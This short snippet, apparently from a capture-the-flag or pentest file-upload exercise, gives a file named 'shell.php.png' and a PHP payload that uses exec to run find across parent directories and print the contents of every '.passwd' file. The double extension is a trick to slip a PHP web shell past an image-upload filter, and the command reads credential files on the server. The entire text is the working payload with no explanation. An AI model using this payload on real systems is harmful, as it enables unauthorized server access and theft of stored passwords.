File name: `shell.php.png`

Payload:
```php
<?php
echo exec('find ../../../ -name ".passwd" -exec cat {} \;');
?>
```